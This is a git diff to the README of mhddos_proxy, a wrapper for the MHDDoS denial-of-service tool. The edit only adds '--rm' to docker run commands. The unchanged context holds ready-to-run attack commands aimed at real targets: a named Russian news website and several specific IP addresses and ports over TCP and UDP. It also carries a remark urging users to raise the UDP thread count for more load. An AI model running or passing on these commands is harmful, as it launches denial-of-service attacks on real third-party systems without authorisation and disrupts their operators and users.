@@ -40,7 +40,7 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
 
 ### Docker
 
-    docker run -it portholeascend/mhddos_proxy:latest COMMAND
+    docker run -it --rm portholeascend/mhddos_proxy:latest COMMAND
 
 ### Python
 
@@ -97,7 +97,7 @@ Separate parameter `--udp-threads` controls the load, the default is 1, **INCREA
 
     python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
-    docker run -it portholeascend/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
+    docker run -it --rm portholeascend/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
 Target specification
 
